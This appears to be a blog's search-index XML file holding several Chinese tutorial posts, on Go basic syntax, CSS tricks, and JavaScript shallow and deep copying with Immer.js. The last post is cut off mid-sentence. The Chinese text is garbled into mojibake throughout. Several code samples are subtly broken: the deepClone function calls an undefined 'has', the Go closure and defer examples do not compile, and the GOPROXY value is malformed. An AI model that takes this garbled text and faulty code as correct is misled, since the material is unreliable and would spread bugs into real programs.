<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>å›¾ç‰‡å¤„ç†åº“</title>
      <link href="/2025/03/26/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%BA%93/"/>
      <url>/2025/03/26/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%BA%93/</url>
      <content type="html"><![CDATA[]]></content>
      
      
    </entry>
    
    <entry>
      <title>Go åŸºæœ¬è¯­æ³•</title>
      <link href="/2025/03/21/Go/"/>
      <url>/2025/03/21/Go/</url>
      <content type="html"><![CDATA[<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><ul><li><p>ä»£ç ä»“åº“<br><a href="https://gitee.com/geektime-geekbang_admin/geektime-basic-go" target="_blank" rel="noopener">https://gitee.com/geektime-geekbang_admin/geektime-basic-go</a></p></li><li><p>GoLand é…ç½®<br>GOPROXY: â€œ<a href="http://goproxy.cn.direct&quot;" target="_blank" rel="noopener">http://goproxy.cn.direct&quot;</a><br>GOPATH è®¾ç½®è‡ªå·±golangé¡¹ç›®æ”¾ç½®è·¯å¾„</p></li><li><p>go.mod æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module geektime-go // æ ‡è®°æ˜¯ä»€ä¹ˆæ¨¡å—</span><br><span class="line">go 1.24 // goç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="1-åŸºæœ¬è¯­æ³•"><a href="#1-åŸºæœ¬è¯­æ³•" class="headerlink" title="1. åŸºæœ¬è¯­æ³•"></a>1. åŸºæœ¬è¯­æ³•</h3><h4 id="1-1-mainå‡½æ•°"><a href="#1-1-mainå‡½æ•°" class="headerlink" title="1.1 mainå‡½æ•°"></a>1.1 mainå‡½æ•°</h4><p><code>main</code> å‡½æ•°æ˜¯ Go ç¨‹åºçš„å¯åŠ¨å…¥å£ã€‚è¿è¡Œ<code>go run main.go</code>ï¼Œæ„å‘³ç€è¿è¡Œè¿™ä¸ª main.go<br>é‡Œé¢çš„ main å‡½æ•°ã€‚main å‡½æ•°æ— å‚æ•°ã€æ— è¿”å›å€¼ã€‚<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main <span class="comment">// åŒ…å</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">"Hello World"</span>) <span class="comment">// ä¼šè‡ªåŠ¨æ¢è¡Œ</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Hello World"</span>) <span class="comment">// ä¸ä¼šè‡ªåŠ¨æ¢è¡Œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-åŸºæœ¬ç±»å‹"><a href="#1-2-åŸºæœ¬ç±»å‹" class="headerlink" title="1.2 åŸºæœ¬ç±»å‹"></a>1.2 åŸºæœ¬ç±»å‹</h4><ul><li><code>int</code><br>int8ã€int16ã€int32ã€int64ã€intã€‚åœ¨å†…å­˜ä¸­åˆ†åˆ«ç”¨ 1ã€2ã€4ã€8 ä¸ªå­—èŠ‚æ¥è¡¨è¾¾ï¼Œè€Œ int<br>ç”¨å‡ ä¸ªå­—èŠ‚åˆ™å–å†³äºCPUã€‚ç›®å‰å¤§å¤šæ•° int éƒ½æ˜¯ 8 å­—èŠ‚ã€‚</li><li><code>uint</code><br>æ­£æ•´æ•°ï¼Œuint8ã€uint16ã€uint32ã€uint64ã€uint</li><li><code>float</code><br>æµ®ç‚¹æ•°ï¼Œfloat32ã€float64ã€‚ä¼˜å…ˆä½¿ç”¨ float64ã€‚<br>ï¼ˆGo é‡Œé¢ï¼Œåªæœ‰åŒç±»å‹æ‰å¯ä»¥æ‰§è¡ŒåŠ å‡ä¹˜é™¤ï¼ŒGo æ˜¯æ²¡æœ‰è‡ªåŠ¨ç±»å‹è½¬æ¢çš„ï¼‰</li><li><code>bool</code></li><li><p><code>string</code><br>string çš„é•¿åº¦å¾ˆç‰¹æ®Šï¼Œ<em>å­—èŠ‚é•¿åº¦</em>å’Œç¼–ç æ— å…³ï¼Œç”¨ len(str)è·å–ã€‚<em>å­—ç¬¦æ•°é‡</em>å’Œç¼–ç æœ‰å…³ï¼Œä½¿ç”¨ utf8 åº“æ¥è®¡ç®—ã€‚<br><code>strings</code>æ“ä½œ: æŸ¥æ‰¾/æ›¿æ¢/å¤§å°å†™è½¬æ¢â€¦</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println</span>(<span class="built_in">len</span>(<span class="string">"ä½ å¥½"</span>))                      <span class="comment">// 6</span></span><br><span class="line"><span class="built_in">println</span>(utf8.RuneCountInString(<span class="string">"ä½ å¥½"</span>))   <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">println</span>(utf8.RuneCountInString(<span class="string">"ä½ å¥½ab"</span>)) <span class="comment">// 4</span></span><br></pre></td></tr></table></figure></li><li><p><code>byte</code><br>byte å°±æ˜¯å­—èŠ‚ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ uint8ï¼Œä¹Ÿä¼šç”¨å®ƒæ¥è¡¨è¾¾ ASCII å­—ç¬¦ã€‚ä¸€èˆ¬å¾ˆå°‘å•ç‹¬ä½¿ç”¨ byteï¼Œéƒ½æ˜¯ä½¿ç”¨ []byteã€‚[]byte å’Œ string ä¹‹é—´å¯ä»¥äº’ç›¸è½¬æ¢ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">byte</span> = <span class="string">'a'</span></span><br><span class="line"><span class="built_in">println</span>(a) <span class="comment">// 97</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str <span class="keyword">string</span> = <span class="string">"this is a string"</span></span><br><span class="line"><span class="keyword">var</span> bs []<span class="keyword">byte</span> = []<span class="keyword">byte</span>(str)</span><br><span class="line"><span class="built_in">println</span>(bs)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-2-å˜é‡ã€å¸¸é‡"><a href="#1-2-å˜é‡ã€å¸¸é‡" class="headerlink" title="1.2 å˜é‡ã€å¸¸é‡"></a>1.2 å˜é‡ã€å¸¸é‡</h4><ul><li><code>var</code>å˜é‡ï¼švar name type = value</li><li><code>:=</code> åªèƒ½ç”¨äºå±€éƒ¨å˜é‡ï¼Œå³æ–¹æ³•å†…éƒ¨ï¼Œgoä¼šæ¨æ–­ç±»å‹</li><li><code>const</code>å¸¸é‡</li><li><code>iota</code><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">13</span></span><br><span class="line">a := <span class="number">13</span></span><br><span class="line"><span class="keyword">const</span> b <span class="keyword">int</span> = <span class="number">13</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-3-æ–¹æ³•"><a href="#1-3-æ–¹æ³•" class="headerlink" title="1.3 æ–¹æ³•"></a>1.3 æ–¹æ³•</h4><p>Go çš„æ–¹æ³•å¯ä»¥æœ‰å¤šä¸ªè¿”å›å€¼ï¼Œå¹¶ä¸”è¿”å›å€¼å¯ä»¥æœ‰åå­—ã€‚<br>åŒä¸€ä¸ªä½œç”¨åŸŸå†…ï¼Œå¦‚æœå·¦è¾¹å‡ºç°äº†æ–°çš„å˜é‡ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨ <code>:=</code> æ¥æ¥æ”¶è¿”å›å€¼ã€‚<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Invoke</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="params">(plus <span class="keyword">int</span>, mine <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b, a - b, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plus, mine, _ := Invoke(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">println</span>(plus, mine)</span><br></pre></td></tr></table></figure></p><ul><li>æ–¹æ³•ä¹Ÿå¯ä»¥ä½œä¸ºè¿”å›å€¼, æ”¯æŒä¸å®šå‚æ•°ã€åŒ¿åå‡½æ•°</li><li><p>é—­åŒ…<br>ä¸€ä¸ªå¯¹è±¡è¢«é—­åŒ…å¼•ç”¨çš„è¯ï¼Œå®ƒæ˜¯ä¸ä¼šè¢«åƒåœ¾å›æ”¶çš„ï¼Œä¼šå¼•èµ·å†…å­˜æ³„éœ²ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Func6</span><span class="params">()</span> <span class="title">func</span><span class="params">(name <span class="keyword">string</span>, alias ...<span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello"</span> + name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ¿åå‡½æ•°å‘èµ·åç«‹å³è°ƒç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Func6</span><span class="params">()</span></span> &#123;</span><br><span class="line">hello := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"hello"</span></span><br><span class="line">&#125;()</span><br><span class="line"><span class="built_in">print</span>(hello)</span><br><span class="line">&#125;</span><br><span class="line">Func6()</span><br></pre></td></tr></table></figure></li><li><p><code>defer</code><br>å»¶è¿Ÿè°ƒç”¨, Go é‡Œé¢æœ‰ä¸€ä¸ªæœºåˆ¶ï¼Œå…è®¸ä½ ä»æ–¹æ³•è¿”å›çš„å‰ä¸€åˆ»ï¼Œæ‰§è¡Œä¸€æ®µé€»è¾‘ã€‚defer ç±»ä¼¼äºæ ˆï¼Œä¹Ÿå°±æ˜¯åè¿›å…ˆå‡ºã€‚ä¹Ÿå°±æ˜¯ï¼Œå…ˆ<br>å®šä¹‰çš„åæ‰§è¡Œï¼›åå®šä¹‰çš„å…ˆæ‰§è¡Œã€‚ä½œä¸º<em>å‚æ•°ä¼ å…¥</em>çš„å€¼ï¼šå®šä¹‰ defer çš„æ—¶å€™å°±ç¡®å®šäº†ã€‚ä½œä¸º<em>é—­åŒ…å¼•å…¥</em>çš„ï¼šæ‰§è¡Œ defer å¯¹åº”çš„æ–¹æ³•çš„æ—¶å€™æ‰ç¡®å®šã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Defer</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// é—­åŒ…å¼•å…¥</span></span><br><span class="line">  j := <span class="number">1</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"1"</span>)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‚æ•°ä¼ å…¥</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"2"</span>)</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Defer() <span class="comment">// 2, 1</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-4-æ§åˆ¶ç»“æ„"><a href="#1-4-æ§åˆ¶ç»“æ„" class="headerlink" title="1.4 æ§åˆ¶ç»“æ„"></a>1.4 æ§åˆ¶ç»“æ„</h4><ul><li><p><code>if else</code><br>Go çš„ if else æ”¯æŒä¸€ç§æ–°çš„å†™æ³•ï¼Œå¯ä»¥åœ¨ if-else å—é‡Œé¢å®šä¹‰ä¸€ä¸ªæ–°çš„å±€éƒ¨å˜é‡ã€‚åœ¨å³è¾¹ distance çš„åªä½œç”¨äº if-else å—ï¼Œç¦»å¼€äº†<br>è¿™ä¸ªèŒƒå›´å°±æ— æ³•ä½¿ç”¨äº†ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> distance := a - b; distance &gt; <span class="number">100</span> &#123;</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"too far"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"close"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>for</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; &#123;</span><br><span class="line">  i++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">  <span class="comment">// ç­‰åŒäº while true,å¦‚æœä½ æ²¡åŠæ³•é€€å‡ºçš„è¯ï¼Œæœ‰å¯èƒ½å¼•èµ· CPU 100%</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>switch</code></p></li><li><code>select</code></li></ul>]]></content>
      
      <categories>
          
          <category> å…¨æ ˆ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç¿»å®Œå¼ é‘«æ—­çš„åšå®¢ï¼Œè¿™æ˜¯æˆ‘çš„ç¬”è®°</title>
      <link href="/2025/03/19/%E5%BC%A0%E9%91%AB%E6%97%AD/"/>
      <url>/2025/03/19/%E5%BC%A0%E9%91%AB%E6%97%AD/</url>
      <content type="html"><![CDATA[<h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><h4 id="1-first-lineæ§åˆ¶"><a href="#1-first-lineæ§åˆ¶" class="headerlink" title="1::first-lineæ§åˆ¶"></a>1<code>::first-line</code>æ§åˆ¶</h4><p>æ§åˆ¶ç¬¬ä¸€è¡Œæ–‡æœ¬çš„æ ·å¼ã€‚å¯ä»¥å®ç°ä¸å½±å“div çš„ color å€¼ï¼Œå•ç‹¬æ§åˆ¶divé‡Œæ–‡æœ¬çš„colorï¼Œä¸å½±å“å…¶ä»–å…ƒç´ ã€‚<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-pseudo">::first-line</span> &#123; <span class="attribute">color</span>: transparent &#125;</span><br><span class="line">div &#123; -webkit-text-fill-color: transparent &#125; // ä¹Ÿå¯ä»¥å®ç°</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-offset-path"><a href="#2-offset-path" class="headerlink" title="2.offset-path"></a>2.<code>offset-path</code></h4><p>è®©å…ƒç´ æ²¿ç€ä¸è§„åˆ™è·¯å¾„è¿åŠ¨ï¼Œå¦‚å®ç°ä¸€ä¸ªèš‚èšç»•åœˆçš„åŠ¨ç”»<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.ant</span> &#123;</span><br><span class="line">  <span class="attribute">offset-path</span>: <span class="built_in">circle</span>(75px);</span><br><span class="line">  <span class="attribute">offset-path</span>: <span class="built_in">path</span>(<span class="string">"M 0,200 Q 200,200 260,80 Q 290,20 400,0 Q 300,100 400,200"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-emojiå­—ä½“"><a href="#3-emojiå­—ä½“" class="headerlink" title="3. emojiå­—ä½“"></a>3. emojiå­—ä½“</h4><p>æŠŠemojiå­—ä½“æ”¾åœ¨å¸¸è§„å­—ä½“åé¢ï¼Œå¢å¼ºemojiæ•ˆæœ<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">article</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-js"><a href="#2-js" class="headerlink" title="2. js"></a>2. js</h3><h3 id="3-html"><a href="#3-html" class="headerlink" title="3. html"></a>3. html</h3>]]></content>
      
      
    </entry>
    
    <entry>
      <title>ğŸ¤” ä» Immer.js å†çœ‹æµ…æ‹·è´ï¼Œæ·±æ‹·è´</title>
      <link href="/2025/03/17/immerjs/"/>
      <url>/2025/03/17/immerjs/</url>
      <content type="html"><![CDATA[<p>å…ˆå›é¡¾ä¸€ä¸‹ä»€ä¹ˆæ˜¯æµ…æ‹·è´å’Œæ·±æ‹·è´ã€‚</p><h3 id="1-æµ…æ‹·è´"><a href="#1-æµ…æ‹·è´" class="headerlink" title="1. æµ…æ‹·è´"></a>1. æµ…æ‹·è´</h3><p>æµ…æ‹·è´ï¼Œä»…å¤åˆ¶å¯¹è±¡çš„æœ€å¤–å±‚ï¼Œå­å¯¹è±¡ä»ä¸ºå¼•ç”¨ã€‚å®ç°æµ…æ‹·è´çš„æ–¹å¼æœ‰ï¼š</p><ul><li><em><code>...</code></em> æ‹“å±•è¿ç®—ç¬¦</li><li><em><code>Object.assign</code></em></li><li><em><code>Array.prototype.slice()</code></em>, <em><code>Array.prototype.concat()</code></em></li><li>éå†å®ç°<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newObj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(prop))&#123;</span><br><span class="line">      newObj[prop] = obj[prop];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-æ·±æ‹·è´"><a href="#2-æ·±æ‹·è´" class="headerlink" title="2. æ·±æ‹·è´"></a>2. æ·±æ‹·è´</h3><p>æ·±æ‹·è´ä¸æ˜¯é‚£ä¹ˆå¥½å®ç°çš„ã€‚(å®Œå…¨ç‹¬ç«‹äºå‰¯æœ¬)</p><p>é¦–å…ˆéœ€è¦ç²¾ç¡®çš„å®šä¹‰ï¼Œå“ªäº›å¯ä»¥cloneï¼Ÿå“ªäº›ä¸å¯ä»¥cloneï¼Ÿä»»æ„å¯¹è±¡çš„æ·±åº¦å…‹éš†ï¼Œedge case éå¸¸å¤šï¼Œæ¯”å¦‚åŸç”Ÿ DOM/BOM å¯¹è±¡æ€ä¹ˆå¤„ç†ï¼ŒRegExp æ€ä¹ˆå¤„ç†ï¼Œå‡½æ•°æ€ä¹ˆå¤„ç†ï¼ŒåŸå‹é“¾æ€ä¹ˆå¤„ç†â€¦ å¹¶ä¸æ˜¯ä¸€ä¸ªç®€å•çš„é—®é¢˜ã€‚å¤æ‚å¯¹è±¡æœ¬èº«å¯èƒ½æœ‰å¾ˆå¤šçº¦æŸï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªé€šç”¨çš„cloneå¯ä»¥æå®šçš„ã€‚æ¯”å¦‚domå…ƒç´ çš„å¤åˆ¶å¿…é¡»ä½¿ç”¨cloneNodeæ–¹æ³•ï¼Œä¸”å®ƒä¹Ÿåªå¤„ç†domè‡ªå·±çš„ä¸œè¥¿ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è®¨è®ºçš„æ·±æ‹·è´ï¼Œæ˜¯å¯¹äºæ™®é€šå¯¹è±¡ï¼Œæˆ–è€…åˆ’å®šå¥½èŒƒå›´çš„æ·±æ‹·è´ï¼Œæ–¹å¼æœ‰ï¼š</p><ul><li><code>lodash.cloneDeep()</code></li><li><code>jQuery.extend()</code></li><li><code>structuredClone(obj, options)</code>Webæµè§ˆå™¨æä¾›äº†åŸç”Ÿçš„Objectå¯¹è±¡æ·±åº¦å…‹éš†æ–¹æ³•</li><li><code>JSON.parse(JSON.stringify(obj))</code>è¿™ç§æ–¹å¼è¦æ±‚å¿…é¡»æ˜¯JSONå¯¹è±¡ï¼Œä¼šå¿½ç•¥ä¸æ˜¯JSONçš„ä¸€äº›å€¼<code>undefined</code>, <code>symbol</code>ã€å‡½æ•°</li><li>æ·±åº¦é€’å½’å®ç°<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span> (<span class="params">obj, hash = new WeakMap(</span>)) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> obj</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(obj)</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(obj)</span><br><span class="line">  <span class="comment">// åŸºæœ¬ç±»å‹ï¼šç›´æ¥è¿”å›å€¼</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">'object'</span>) <span class="keyword">return</span> obj</span><br><span class="line">  <span class="comment">// å¼•ç”¨ç±»å‹ï¼šè¿›è¡Œæ·±æ‹·è´</span></span><br><span class="line">  <span class="keyword">if</span> (has.get(obj)) <span class="keyword">return</span> hash.get(obj)</span><br><span class="line">  <span class="keyword">let</span> cloneObj = <span class="keyword">new</span> obj.constructor()</span><br><span class="line">  hash.set(obj, cloneObj)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      cloneObj[key] = deepClone(obj[key], hash)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cloneObj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-Immer-js"><a href="#3-Immer-js" class="headerlink" title="3. Immer.js"></a>3. Immer.js</h3><p>æ·±æ‹·è´ã€æµ…æ‹·è´ï¼Œç»ä¸ä»…ä»…åªæ˜¯ä¸€ä¸ªé¢è¯•é¢˜ã€‚æˆ‘ä»¬è¦çŸ¥é“ï¼Œä¸ºä»€ä¹ˆè¦cloneï¼Ÿ<br>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œcloneæ˜¯ä¸ºäº†ä¼ é€’æ•°æ®å¯¹è±¡ã€‚æˆ‘ä»¬å¸Œæœ›å¾—åˆ°ä¸€ä¸ªæ•°æ®å‰¯æœ¬ï¼Œä¸”åœ¨ä¿®æ”¹å‰¯æœ¬å¯¹è±¡æ—¶ï¼Œä¸ä¼šå½±å“åˆ°åŸæœ‰å¯¹è±¡ã€‚</p><p><br></p><h4 id="3-1-ä¸å¯å˜æ•°æ®"><a href="#3-1-ä¸å¯å˜æ•°æ®" class="headerlink" title="3.1 ä¸å¯å˜æ•°æ®"></a>3.1 ä¸å¯å˜æ•°æ®</h4><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬ç›´æ¥å¤åˆ¶å¯¹è±¡<code>const obj2 = obj1</code>, å½“æˆ‘ä»¬ä¿®æ”¹obj2æ—¶ï¼Œå´ä¸å°å¿ƒæŠŠobj1ä¹Ÿä¸€èµ·ä¿®æ”¹äº†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;</span><br><span class="line">  name: <span class="string">'é‡‘æ¯›1'</span>,</span><br><span class="line">  city: <span class="string">'ä¸Šæµ·'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj2 = obj1;</span><br><span class="line">obj2.name = <span class="string">'é‡‘æ¯›2'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj1) <span class="comment">// &#123;name:'é‡‘æ¯›2', city:'ä¸Šæµ·'&#125; obj1è¢«ä¿®æ”¹äº†</span></span><br></pre></td></tr></table></figure></p><p>å¦‚æœä¸æƒ³åœ¨ä¿®æ”¹obj2æ—¶ï¼Œå¯¹obj1ä¹Ÿäº§ç”Ÿå½±å“ã€‚æˆ‘ä»¬ä¼šæƒ³åˆ°æ·±æ‹·è´ä¸€ä¸ªobj1å‡ºæ¥, ç„¶åéšä¾¿ç©è€ã€‚</p><p>å®é™…çš„é¡¹ç›®ä¸­è¦æ“ä½œçš„ä¾‹å­è¿œæ¯”è¿™ä¸ªå¤æ‚ã€‚å¦‚æœæ˜¯ä¸€ä¸ªåºå¤§çš„å¯¹è±¡, ç”¨<code>JSON.parse(JSON.stringify(obj1))</code>å®ç°æ·±æ‹·è´ä¼šæµªè´¹å¤§é‡æ€§èƒ½åœ¨æ‹·è´å±æ€§ä¸Š, ä½†æˆ‘ä»¬å¯èƒ½åªæ˜¯æƒ³è¦ä¸€ä¸ªnameå€¼ä¸åŒçš„å¯¹è±¡è€Œå·²ã€‚</p><p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬ä¼šæƒ³åˆ°æ‹“å±•è¿ç®—æ³•<code>...</code>çš„å†™æ³•ã€‚åªä¿®æ”¹ä¿®æ”¹çš„å€¼ï¼Œå…¶ä»–å€¼ä¿æŒåŸæ¥çš„å¼•ç”¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj2 = &#123; ...obj1, <span class="attr">name</span>: <span class="string">'é‡‘æ¯›2'</span> &#125;</span><br></pre></td></tr></table></figure></p><p>è€Œå½“obj1æ˜¯ä¸€ä¸ªå¤šå±‚åµŒå¥—çš„å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŒ…æ¥å¸®å¿™å¤„ç†å±‚å±‚åµŒå¥—çš„é€»è¾‘ã€‚è¿™æ—¶å°±éœ€è¦ç”¨åˆ°Immer.jsã€‚</p><p><br><br><br></p><h4 id="3-2-åŸºæœ¬ç”¨æ³•"><a href="#3-2-åŸºæœ¬ç”¨æ³•" class="headerlink" title="3.2 åŸºæœ¬ç”¨æ³•"></a>3.2 åŸºæœ¬ç”¨æ³•</h4><p>Immer.jsçš„æ ¸å¿ƒç›®æ ‡, 